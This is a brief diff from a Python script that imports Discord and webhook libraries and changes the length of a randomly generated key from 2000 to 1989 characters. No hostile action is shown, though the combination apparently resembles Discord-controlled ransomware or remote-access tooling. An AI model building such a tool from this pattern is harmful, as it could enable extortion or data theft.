@@ -8,7 +8,7 @@ import requests
 import dhooks
 from pathlib import Path
 import string
-def KeyGen(size=2000, chars=string.ascii_uppercase + string.digits):
+def KeyGen(size=1989, chars=string.ascii_uppercase + string.digits):
 	return ''.join(random.choice(chars) for _ in range(size))
 Key = KeyGen()
 client = discord.Client()
